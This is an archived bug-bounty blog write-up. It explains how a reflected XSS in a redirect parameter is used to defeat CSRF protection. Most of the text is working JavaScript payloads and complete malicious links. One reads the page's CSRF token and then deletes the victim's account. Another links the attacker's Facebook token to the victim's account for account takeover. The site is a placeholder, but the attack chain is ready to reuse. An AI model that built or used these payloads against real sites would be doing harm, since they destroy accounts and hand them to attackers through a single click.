# Bypass CSRF Protection

- **Source URL:** https://medium.com/@dr4040x00/bypass-csrf-protection-707b81c04149?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240716134634/https://medium.com/@dr4040x00/bypass-csrf-protection-707b81c04149
- **Fetched:** 2026-11-27
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/6671 (id 6671)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Bypass CSRF Protection

Hello friends,

Today, we’ll discuss how to bypass CSRF protection using a reflected XSS, (out of scope)

lest start.

there a reflected xss but out of scope

[https://example.com/leaving?redirectUrl=javascript:alert(document.cookie)](https://example.com/leaving?redirectUrl=javascript%3Aalert%28document.cookie%29)

I reported it but get informative.

After finishing my exams trying again, There is a delete account function on a website, so I tried to use this vulnerability to bypass CSRF protection.

lets go,

there are tow javascript functions

**Frist function:**

 `javascript:fetch('https://www.example.com/dashboard/settings/account-settings', { method: 'GET', credentials: 'include', headers: { 'Accept': 'text/html', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' } }).then(response => response.text()).then(html => { const parser = new DOMParser(); const doc = parser.parseFromString(html, 'text/html'); const csrfToken = doc.querySelector('meta[name="csrf-token"]').getAttribute('content'); alert(csrfToken); }).catch(error => console.error('Error fetching CSRF token:', error));````
fetch('https://www.example.com/dashboard/settings/account-settings', { 
    method: 'GET', 
    credentials: 'include', 
    headers: { 
        'Accept': 'text/html', 
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' 
    } 
})
.then(response => response.text())
.then(html => { 
    const parser = new DOMParser(); 
    const doc = parser.parseFromString(html, 'text/html'); 
    const csrfToken = doc.querySelector('meta[name="csrf-token"]').getAttribute('content'); 
    alert(csrfToken); 
})
.catch(error => console.error('Error fetching CSRF token:', error));
```
This function fetches the target URL and retrieves the CSRF token from the response

**Second function**:

`javascript:(function(){fetch('https://www.example.com/dashboard/settings/account-settings', { method: 'GET', credentials: 'include', headers: { 'Accept': 'text/html', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' } }).then(response => response.text()).then(html => { const parser = new DOMParser(); const doc = parser.parseFromString(html, 'text/html'); const csrfToken = doc.querySelector('meta[name=csrf-token]').getAttribute('content'); const formData = new FormData(); formData.append('deleteFeedback[reasonIds][]', 'other'); formData.append('deleteFeedback[message]', ''); formData.append('password', ''); const params = new URLSearchParams(); formData.forEach((value, key) => { params.append(key, value); }); fetch('https://www.example.com/rpc/account-settings-rpc/delete-account', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'X-CSRF-Token': csrfToken }, body: params }).then(response => response.text()).then(data => alert(data)).catch(error => console.error('Error:', error)); }).catch(error => console.error('Error fetching CSRF token:', error));})();````
(function() {
    fetch('https://www.example.com/dashboard/settings/account-settings', { 
        method: 'GET', 
        credentials: 'include', 
        headers: { 
            'Accept': 'text/html', 
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' 
        } 
    })
    .then(response => response.text())
    .then(html => { 
        const parser = new DOMParser(); 
        const doc = parser.parseFromString(html, 'text/html'); 
        const csrfToken = doc.querySelector('meta[name="csrf-token"]').getAttribute('content');
        
        const formData = new FormData();
        formData.append('deleteFeedback[reasonIds][]', 'other');
        formData.append('deleteFeedback[message]', '');
        formData.append('password', '');
        
        const params = new URLSearchParams();
        formData.forEach((value, key) => {
            params.append(key, value);
        });
        
        return fetch('https://www.example.com/rpc/account-settings-rpc/delete-account', { 
            method: 'POST', 
            headers: { 
                'Content-Type': 'application/x-www-form-urlencoded', 
                'X-CSRF-Token': csrfToken 
            }, 
            body: params 
        });
    })
    .then(response => response.text())
    .then(data => alert(data))
    .catch(error => console.error('Error:', error));
})();
```
This function fetches the CSRF token from the frist function and uses it to send a delete account request.

final link:

`https://www.example.com/leaving?redirectUrl=javascript:(function(){fetch('https://www.example.com/dashboard/settings/account-settings', { method: 'GET', credentials: 'include', headers: { 'Accept': 'text/html', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' } }).then(response => response.text()).then(html => { const parser = new DOMParser(); const doc = parser.parseFromString(html, 'text/html'); const csrfToken = doc.querySelector('meta[name=csrf-token]').getAttribute('content'); const formData = new FormData(); formData.append('deleteFeedback[reasonIds][]', 'other'); formData.append('deleteFeedback[message]', ''); formData.append('password', ''); const params = new URLSearchParams(); formData.forEach((value, key) => { params.append(key, value); }); fetch('https://www.example.com/rpc/account-settings-rpc/delete-account', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'X-CSRF-Token': csrfToken }, body: params }).then(response => response.text()).then(data => alert(data)).catch(error => console.error('Error:', error)); }).catch(error => console.error('Error fetching CSRF token:', error));})()`
if the user clicks the following link, their account will be deleted.

**There** is another impact to linking the account to your social account leading to Account take over (ATO)

Retrieve the Facebook token by intercepting the social account linking request

`javascript:(function(){fetch('https://www.example.com/dashboard/settings/account-settings', { method: 'GET', credentials: 'include', headers: { 'Accept': 'text/html', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' } }).then(response => response.text()).then(html => { const parser = new DOMParser(); const doc = parser.parseFromString(html, 'text/html'); const csrfToken = doc.querySelector('meta[name=csrf-token]').getAttribute('content'); const formData = new FormData();formData.append('token', 'your token'); formData.append('socialAccountType', 'facebook'); const params = new URLSearchParams(); formData.forEach((value, key) => { params.append(key, value); }); fetch('https://www.example.com/rpc/account-settings-rpc/create-social-account', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'X-CSRF-Token': csrfToken }, body: params }).then(response => response.text()).then(data => alert(data)).catch(error => console.error('Error:', error)); }).catch(error => console.error('Error fetching CSRF token:', error));})();````
(function() {
    fetch('https://www.example.com/dashboard/settings/account-settings', { 
        method: 'GET', 
        credentials: 'include', 
        headers: { 
            'Accept': 'text/html', 
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' 
        } 
    })
    .then(response => response.text()) 
    .then(html => { 
        const parser = new DOMParser(); 
        const doc = parser.parseFromString(html, 'text/html'); 
        const csrfToken = doc.querySelector('meta[name="csrf-token"]').getAttribute('content');
        
        const formData = new FormData();
        formData.append('token', 'your token');
        formData.append('socialAccountType', 'facebook');
        
        const params = new URLSearchParams();
        formData.forEach((value, key) => {
            params.append(key, value);
        });
        
        return fetch('https://www.example.com/rpc/account-settings-rpc/create-social-account', { 
            method: 'POST', 
            headers: { 
                'Content-Type': 'application/x-www-form-urlencoded', 
                'X-CSRF-Token': csrfToken 
            }, 
            body: params 
        });
    })
    .then(response => response.text()) 
    .then(data => alert(data)) 
    .catch(error => console.error('Error:', error));})();
```
final link

`https://www.example.com/leaving?redirectUrl=javascript:(function(){fetch('https://www.example.com/dashboard/settings/account-settings', { method: 'GET', credentials: 'include', headers: { 'Accept': 'text/html', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' } }).then(response => response.text()).then(html => { const parser = new DOMParser(); const doc = parser.parseFromString(html, 'text/html'); const csrfToken = doc.querySelector('meta[name=csrf-token]').getAttribute('content'); const formData = new FormData();formData.append('token', 'your token'); formData.append('socialAccountType', 'facebook'); const params = new URLSearchParams(); formData.forEach((value, key) => { params.append(key, value); }); fetch('https://www.example.com/rpc/account-settings-rpc/create-social-account', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'X-CSRF-Token': csrfToken }, body: params }).then(response => response.text()).then(data => alert(data)).catch(error => console.error('Error:', error)); }).catch(error => console.error('Error fetching CSRF token:', error));})();`
As same as before, if a user clicks on the following link, their account will be linked to your social account, allowing you to login to victim account

Thanks for reading.
